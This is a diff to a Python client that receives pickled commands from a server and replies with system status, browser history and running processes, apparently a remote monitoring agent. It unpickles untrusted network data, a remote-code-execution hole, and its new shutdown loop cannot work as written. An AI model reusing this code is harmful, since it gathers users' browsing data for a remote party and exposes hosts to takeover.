@@ -3,6 +3,7 @@ import pickle
 import threading
 import os
 import platform
+import time
 from cmds import commands
 
 
@@ -108,19 +109,21 @@ class client:
     def reciever(self,ev):
         print('ready to recieve')
         while not ev.is_set():
-            data = self.server.recv(2048)
+            print('hmm')
+            data = self.server.recv(8000)
             if data != b'':
                 print('recieving data')
                 data = pickle.loads(data)
             if len(data) != 0:
                 if data['command']=='status':
-                    self.server.send(pickle.dumps({'command':'sendadmin','data':self.commands.status()}))
+                    self.server.sendall(pickle.dumps({'command':'sendadmin','data':self.commands.status()}))
                 elif data['command']=='history':
                     self.server.sendall(pickle.dumps({'command':'sendadmin','data':self.commands.bhistory()}))
                 elif data['command']=='listprocess':
                     self.server.sendall(pickle.dumps({'command':'sendadmin','data':self.commands.running_process()}))
                 else:
                     pass
+            data = b''
 
     def start(self):
         print('starting')
@@ -130,8 +133,12 @@ class client:
             if status:
                 self.ev = threading.Event()
                 self.connected = True
-                t = threading.Thread(target=self.reciever,args=(self.ev,))
+                t = threading.Thread(target=self.reciever,args=(self.ev,),daemon=True)
                 t.start()
+                while Exception != KeyboardInterrupt:
+                    time.sleep(10)
+                else:
+                    self.ev.set()
             else:
                 print('cant connect')
 
